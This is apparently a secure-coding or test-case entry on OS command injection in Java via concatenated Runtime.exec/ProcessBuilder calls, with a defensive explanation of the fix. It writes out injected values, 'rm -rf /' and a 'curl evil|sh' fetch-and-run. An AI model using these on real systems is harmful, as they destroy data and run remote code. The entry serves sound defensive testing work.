name: OS command injection via Runtime.exec/ProcessBuilder concatenation
attack_scenario: Attacker supplies host = example.com; rm -rf / (or `curl evil|sh`); the concatenated command line executes the injected commands with the app's privileges.
negative_test_hint: submit host = "example.com; rm -rf /" and assert the injected command never runs because the value stays a single ProcessBuilder argument

exemplar.explanation: Runtime.exec(String) and ProcessBuilder built by string concatenation invoke a shell-like split in which attacker metacharacters inject extra commands with the app's privileges. Passing a fixed program plus each argument as a separate array/varargs element keeps user input a single inert argument that can never be reinterpreted as shell syntax.
